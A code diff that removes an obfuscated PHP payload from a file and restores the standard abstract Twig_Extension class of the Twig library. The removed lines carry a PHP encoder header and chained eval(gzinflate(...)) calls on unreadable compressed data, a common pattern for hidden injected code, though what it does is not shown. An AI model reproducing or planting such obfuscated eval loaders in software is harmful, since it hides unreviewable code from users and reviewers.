@@ -1,10 +1,79 @@
 <?php
- /*
-|#| Message      : This file is confidential and proprietary!
-|#| Product      : SiiKUN PRO PHP Encoder & Obfuscator
-|#| Author       : SiiKUN TM
-|#| URL          : https://github.com/karyakode/siikunpro
-*/
-eval(gzinflate("­–ıORaÇÿ•'F“Ûµšş‚ø¨9E6‡`s9·œ¤‚‰äÔñ¢(•/(h@fÌ|É·ğ­|K--“„BPºmõÛyØúíîröyÎó=ßsÎYW„¥¾\\\\\"É”‰er+%ğy_«ğêVFS¢üÏßèïkóuà‘ÅáPùt¦6×òóåù™ó¡öâ¦%íñÉ†71'}ñÖ³İôkG¦†lµs¾n_Ï˜åpÏ¶c<íİÑ bä–e¦år28¹œÌtê¹(ñ\\–É¿üQï3ØŠ5÷¬Ï÷Âóªm§kiØ¢};İ½6Ğ}6ëöÆ)›@åH,D,0˜/@d‚Ì›ùE~I‘€%“K¥‚;ğÍ	‚‹*Sé	ú÷­6ÍJÏ¤a@£Ÿ°,<‹ÇíŸZ§§6¦(>E,H0ˆ\\Ä4(ªV]GêÍæ™ñ–zğİó@<ìq4XÆö‡5öWZH±J&weĞ§bˆ„*;•ª†,xÙÑéµv™ì£}¿>ª½û÷Yğ}l`B¯ÔÅšªÎióà?Cf¤q_Ã¦ËÆÇºoññMtŞ^q~qÏ¼ÒŸF««ê\"tn½Ê_/Â+¡½WëˆÚßĞ×ü¢ş±Íoè¬íVFNiS3(–SydÜôê~ê•‘Ñåo÷?»ÂFG}K@c­ï¿tÎÒæçp‘°„Rî‘q%bnì‹¨4ŞÆİáIÓĞ‚ê¯©şÉ°s§kb²•ÇtZîµğ–Úùì™u±6v`=˜ó}èoÓY*½&÷¾’Çæ‚”,P-˜A’‰ÖuºÁC|‘”U\"-‚…ÏOÍ#Ğ-”`AM*E’y´scŠE<2}c8±é®¯À2‘¨@&b1d¢#Œ'şŸK˜[æqGG•uä^ì‹7jw¿±)ôk»ı/gÛgv­ÏGP{bûì¥K]0É	ÏHø¶„„¿¤ÁUFYY°/PĞ™(;ä«ğÀ» c?),¤g(HOL¦V 1æ	çMÅp\"‘=Fú´ÿ`Q¯¢´d€pÁ“ÂµJx£\$<0à¤è¬Ò	D`|>d2K\\ıI-¹Ä¹ «ş.O8ôÏò”
-ä¥R	º}W,È,pEĞßÚ¿"));eval(îåë˜„Á™Ù‘û("§V½;Óo*“Ø‹:¶l&u›ÅËh²®%Pí7hbL•Ò\\BŠÆßxŸ¬¿l,;Õµø@Şy…67f˜ş;\$×÷vAHšnSfh/†°‘{rÛÓæD%Ş‚ƒ­ñnÏ+ãTº¤£= àVw|¢¤›.¤úqä ¨|Æ¹;'ìhEê„g0“tĞÜPäöê ¼7¢ü-¯,É5(HŞ	íLe\$]¹OYN³i>W¥5³èİkµ(Hc)"));eval(÷şšå™»ˆ²ÔïÍ©é("Æ²ğÑä–õìùÆàó—¯Ï÷ú–¨İçÂıš¿œµÙ¦øıÈ®Î·ú€ÉìëŸ¸Ã´Â‰Üƒ‹ŠÄÅ£¼ÿù‡õ×ÿö—Ã™Ş› ‹Ä<KÍS×kø÷q*MRŸ[ì´ÒˆBÛ1–rxeÔdöìqğÙÌ»5™Æ*··Íb’
-5ˆå¡y‘ÍD|¾²!ÄCeÔtCÿ€Ö~¤(İš=¾,¡ÌãÒ”RÏ8Ëµ•\"Á_¶|Ê´’V¹ÂĞ~Ú«ı5ŒŞK\"ğ-ØğEôµ^Ó[îÀüXß\$Ì3’rsÙ&Ê¿pm`!PøüôíÜÉë„ëà² é¤¶ÊÍÖ‚ìÌ’™®ÙÊí›¢§Í±Ú÷ú˜§ïªßÛ"));?>
+
+/*
+ * This file is part of Twig.
+ *
+ * (c) 2009 Fabien Potencier
+ *
+ * For the full copyright and license information, please view the LICENSE
+ * file that was distributed with this source code.
+ */
+abstract class Twig_Extension implements Twig_ExtensionInterface
+{
+    /**
+     * {@inheritdoc}
+     *
+     * @deprecated since 1.23 (to be removed in 2.0), implement Twig_Extension_InitRuntimeInterface instead
+     */
+    public function initRuntime(Twig_Environment $environment)
+    {
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getTokenParsers()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getNodeVisitors()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getFilters()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getTests()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getFunctions()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     */
+    public function getOperators()
+    {
+        return array();
+    }
+
+    /**
+     * {@inheritdoc}
+     *
+     * @deprecated since 1.23 (to be removed in 2.0), implement Twig_Extension_GlobalsInterface instead
+     */
+    public function getGlobals()
+    {
+        return array();
+    }
+}
